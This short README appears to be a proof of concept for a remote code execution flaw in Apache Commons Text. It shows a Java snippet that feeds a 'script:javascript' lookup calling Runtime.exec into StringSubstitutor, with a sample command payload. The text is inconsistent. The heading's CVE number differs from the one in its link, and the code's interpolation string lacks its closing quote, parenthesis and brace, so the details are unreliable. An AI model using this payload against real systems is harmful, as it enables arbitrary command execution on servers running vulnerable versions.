# CVE-2022-42899
Apache Common Text starting from version 1.5 to 1.9 has Remote code execution vulnerability [CVE-2022-42899](https://www.cve.org/CVERecord?id=CVE-2022-42889). 

```java
final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('<payload to execute RCE>"); // Here you will pass payload which you want to execute such as 'mkdir /tmp/cve-2022-42899'
```
